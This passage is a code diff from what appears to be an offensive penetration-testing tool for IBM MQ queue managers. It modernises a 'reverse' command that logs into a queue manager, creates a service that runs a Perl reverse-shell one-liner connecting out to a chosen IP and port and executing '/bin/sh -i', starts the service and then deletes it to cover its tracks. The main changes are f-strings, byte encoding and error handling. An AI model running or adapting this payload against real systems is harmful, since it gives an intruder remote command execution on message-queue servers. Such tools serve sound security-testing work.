+        pcf = pymqi.PCFExecute(qmgr)
+        pcf.MQCMD_START_SERVICE(args)
+
+    except pymqi.MQMIError as dme:
+        if dme.reason == pymqi.CMQCFC.MQRCCF_PROGRAM_NOT_AVAILABLE:
+            click.secho(f'The program \'{cmd}\' is not available on the remote system.', fg='red')
+            return
+
+        else:
+            raise dme
+
+    click.secho(f'Giving the service {wait} second(s) to live...', dim=True)
     time.sleep(wait)
 
     # delete service
     click.secho('Cleaning up service...', dim=True)
-    args = {pymqi.CMQC.MQCA_SERVICE_NAME: service_name}
+    args = {
+        pymqi.CMQC.MQCA_SERVICE_NAME: service_name
+    }
 
     pcf = pymqi.PCFExecute(qmgr)
     pcf.MQCMD_DELETE_SERVICE(args)
@@ -1013,7 +1024,7 @@ def reverse(ip, port, service_name, wait):
         service_name = uuid.uuid4()
 
     # Cleanup the service name to remove spaces and dashes and limit to 16 chars
-    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16]
+    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16].encode()
 
     # raw perl, passed as part of a -e argument
     payload = "use Socket;$i='" + str(ip) + "';$p=" + str(port) + \
@@ -1022,10 +1033,10 @@ def reverse(ip, port, service_name, wait):
               "open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
 
     # information
-    click.secho('Ip: {0}'.format(ip), bold=True)
-    click.secho('Port: {0}'.format(port), bold=True)
-    click.secho('Raw Perl: {0}'.format(payload), bold=True, fg='blue')
-    click.secho('Service Name: {0}\n'.format(service_name))
+    click.secho(f'Remote IP: {ip}', dim=True)
+    click.secho(f'Remote Port: {port}', dim=True)
+    click.secho(f'Raw Reverse Shell: {payload}', dim=True, fg='blue')
+    click.secho(f'Service Name: {service_name.decode()}\n', dim=True)
 
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                          mqstate.username, mqstate.password)
@@ -1036,8 +1047,8 @@ def reverse(ip, port, service_name, wait):
         pymqi.CMQC.MQCA_SERVICE_NAME: service_name,
         pymqi.CMQC.MQIA_SERVICE_CONTROL: pymqi.CMQC.MQSVC_CONTROL_MANUAL,
         pymqi.CMQC.MQIA_SERVICE_TYPE: pymqi.CMQC.MQSVC_TYPE_COMMAND,
-        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: '/usr/bin/perl',
-        pymqi.CMQC.MQCA_SERVICE_START_ARGS: "-e \"{0}\"".format(payload)
+        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: '/usr/bin/perl'.encode(),
+        pymqi.CMQC.MQCA_SERVICE_START_ARGS: f'-e "{payload}"'.encode(),
     }
     pcf = pymqi.PCFExecute(qmgr)
     pcf.MQCMD_CREATE_SERVICE(args)
@@ -1046,10 +1057,20 @@ def reverse(ip, port, service_name, wait):
     click.secho('Starting service...', fg='green')
     args = {pymqi.CMQC.MQCA_SERVICE_NAME: service_name}
 
-    pcf = pymqi.PCFExecute(qmgr)
-    pcf.MQCMD_START_SERVICE(args)
+    try:
 
-    click.secho('Giving the service {0} second(s) to live...'.format(wait), dim=True)
+        pcf = pymqi.PCFExecute(qmgr)
+        pcf.MQCMD_START_SERVICE(args)
+
+    except pymqi.MQMIError as dme:
+        if dme.reason == pymqi.CMQCFC.MQRCCF_PROGRAM_NOT_AVAILABLE:
+            click.secho('The program \'/usr/bin/perl\' is not available on the remote system.', fg='red')
+            return
+
+        else:
+            raise dme
+
+    click.secho(f'Giving the service {wait} second(s) to live...', dim=True)
     time.sleep(wait)
 
     # delete service
